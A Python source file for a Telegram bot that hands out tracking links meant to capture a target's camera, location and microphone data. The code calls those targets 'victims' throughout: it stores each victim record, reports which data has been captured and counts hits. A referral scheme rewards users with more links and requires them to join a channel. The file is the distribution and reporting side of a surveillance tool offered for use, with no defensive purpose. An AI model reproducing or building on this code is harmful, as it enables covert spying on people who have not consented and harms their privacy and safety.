import telebot, random, string, time, traceback
from datetime import datetime
from config import BOT_TOKEN, CHANNEL_USERNAME, BASE_URL, REQUIRED_REFS, FREE_LINKS
from database import db

bot = telebot.TeleBot(BOT_TOKEN, threaded=False)

def gen_code(n=8):
    return ''.join(random.choices(string.ascii_lowercase+string.digits, k=n))

def check_ch(uid):
    try:
        m = bot.get_chat_member(CHANNEL_USERNAME, uid)
        return m.status in ('member','administrator','creator')
    except: return False

def msend(cid, txt, **kw):
    try: return bot.send_message(cid, txt, **kw)
    except: return None

def medit(cid, mid, txt, **kw):
    try: return bot.edit_message_text(txt, cid, mid, **kw)
    except: return None

def mk_kb():
    kb = telebot.types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        telebot.types.InlineKeyboardButton("New Link", callback_data="a"),
        telebot.types.InlineKeyboardButton("My Links", callback_data="b"),
        telebot.types.InlineKeyboardButton("Profile", callback_data="c"),
        telebot.types.InlineKeyboardButton("Referral", callback_data="d"),
        telebot.types.InlineKeyboardButton("Stats", callback_data="e"),
    )
    if CHANNEL_USERNAME:
        kb.add(telebot.types.InlineKeyboardButton("Channel", url=f"https://t.me/{CHANNEL_USERNAME[1:]}"))
    return kb

def bk():
    kb = telebot.types.InlineKeyboardMarkup()
    kb.add(telebot.types.InlineKeyboardButton("Menu", callback_data="m"))
    return kb

@bot.message_handler(commands=['start'])
def start(m):
    uid = m.from_user.id
    un = m.from_user.username or 'User'
    fn = m.from_user.first_name or ''
    user = db.get_user(uid)
    new = False
    if not user:
        db.create_user(uid, un, fn)
        user = db.get_user(uid)
        new = True
    args = m.text.split()
    if len(args) > 1 and new:
        try:
            rid = int(args[1])
            if rid != uid and user and not user['referred_by']:
                if db.add_referral(rid, uid):
                    try: bot.send_message(rid, f"New referral!\n{fn} joined!\nTotal: {db.get_user(rid)['refer_count']}")
                    except: pass
        except: pass
    if new: txt = f"Welcome {fn}!\nFree: {FREE_LINKS}\nEvery {REQUIRED_REFS} refs = +1 link"
    else: txt = f"Back {fn}!"
    msend(uid, txt, reply_markup=mk_kb())

@bot.callback_query_handler(func=lambda c: True)
def cb(c):
    uid, d = c.from_user.id, c.data
    try:
        if d == 'm': medit(uid, c.message.message_id, 'Menu', reply_markup=mk_kb())
        elif d == 'c': profile(c)
        elif d == 'a': new_link(c)
        elif d == 'b': my_links(c)
        elif d == 'd': referral(c)
        elif d == 'e': stats(c)
        elif d.startswith('p'):
            try: my_links(c, int(d[1:]))
            except: pass
    except Exception as e:
        print(f"[ERR] {traceback.format_exc()}")
        bot.answer_callback_query(c.id, 'Error', show_alert=True)
    bot.answer_callback_query(c.id)

def profile(c):
    uid = c.from_user.id
    u = db.get_user(uid)
    if not u: medit(uid, c.message.message_id, 'Use /start first', reply_markup=bk()); return
    ch = 'Yes' if check_ch(uid) else 'No'
    av = db.get_available_links(uid)
    vs = db.get_user_victims(uid)
    dc = sum(1 for v in vs if v['camera_data'] or v['location_data'] or v['audio_data'])
    txt = f"Profile\nUID: {uid}\nName: {u['first_name'] or u['username']}\nJoined: {u['join_date'][:10]}\nChannel: {ch}\nRefs: {u['refer_count']}\nTotal Links: {u['total_links_created']}\nAvailable: {av}\nData Collected: {dc}"
    medit(uid, c.message.message_id, txt, reply_markup=bk())

def new_link(c):
    uid = c.from_user.id
    if not check_ch(uid):
        medit(uid, c.message.message_id, f'Join {CHANNEL_USERNAME} first!', reply_markup=bk()); return
    if db.is_rate_limited(uid):
        medit(uid, c.message.message_id, 'Rate limit! Max 5/hour', reply_markup=bk()); return
    av = db.get_available_links(uid)
    if av <= 0:
        u = db.get_user(uid)
        need = REQUIRED_REFS - (u['refer_count'] % REQUIRED_REFS) if u else REQUIRED_REFS
        if need == REQUIRED_REFS: need = 0
        medit(uid, c.message.message_id, f'No links left! Need {max(1,need)} more referral(s)', reply_markup=mk_kb()); return
    code = gen_code()
    cu = f'{BASE_URL}/camera/{code}'
    lu = f'{BASE_URL}/location/{code}'
    au = f'{BASE_URL}/audio/{code}'
    if not db.create_victim(uid, code, cu, lu, au):
        medit(uid, c.message.message_id, 'Failed to create', reply_markup=bk()); return
    txt = f"New link created!\nCode: {code}\nAvailable: {av-1}\n\nCamera: {cu}\nLocation: {lu}\nAudio: {au}"
    kb = telebot.types.InlineKeyboardMarkup()
    kb.add(telebot.types.InlineKeyboardButton('My Links', callback_data='b'))
    kb.add(telebot.types.InlineKeyboardButton('Menu', callback_data='m'))
    medit(uid, c.message.message_id, txt, reply_markup=kb)

def my_links(c, page=0):
    uid = c.from_user.id
    pp = 5; off = page * pp
    vs = db.get_user_victims(uid, pp, off)
    db.c.execute("SELECT COUNT(*) FROM victims WHERE telegram_id=?", (uid,))
    total = db.c.fetchone()[0]
    tp = max(1, (total + pp - 1) // pp)
    if total == 0:
        medit(uid, c.message.message_id, 'No links yet', reply_markup=mk_kb()); return
    txt = f'Links (page {page+1}/{tp})\n\n'
    for v in vs:
        ic = []
        if v['camera_data']: ic.append('[CAM]')
        if v['location_data']: ic.append('[LOC]')
        if v['audio_data']: ic.append('[AUD]')
        st = ' '.join(ic) if ic else '[waiting]'
        txt += f'{v["victim_code"]} {v["created_at"][:10]} {st} hits:{v["access_count"]}\n\n'
    kb = telebot.types.InlineKeyboardMarkup()
    nav = []
    if page > 0: nav.append(telebot.types.InlineKeyboardButton('Prev', callback_data=f'p{page-1}'))
    if page < tp-1: nav.append(telebot.types.InlineKeyboardButton('Next', callback_data=f'p{page+1}'))
    if nav: kb.row(*nav)
    kb.add(telebot.types.InlineKeyboardButton('Menu', callback_data='m'))
    medit(uid, c.message.message_id, txt, reply_markup=kb)

def referral(c):
    uid = c.from_user.id
    bu = bot.get_me().username
    link = f'https://t.me/{bu}?start={uid}'
    u = db.get_user(uid)
    rc = u['refer_count'] if u else 0
    av = rc // REQUIRED_REFS
    need = REQUIRED_REFS - (rc % REQUIRED_REFS)
    if need == REQUIRED_REFS: need = 0
    txt = f"Referral\n{link}\nRefs: {rc}\nExtra: {av}\nFree: {FREE_LINKS}\nNext: {need}"
    medit(uid, c.message.message_id, txt, reply_markup=bk())

def stats(c):
    s = db.get_stats()
    txt = f"Stats\nUsers: {s['users']}\nVictims: {s['victims']}\nCamera: {s['camera']}\nLocation: {s['location']}\nAudio: {s['audio']}"
    medit(c.from_user.id, c.message.message_id, txt, reply_markup=bk())

def run():
    print('Bot running...')
    while True:
        try: bot.infinity_polling(timeout=30, long_polling_timeout=30, skip_pending=True)
        except: time.sleep(3)

if __name__ == '__main__':
    run()
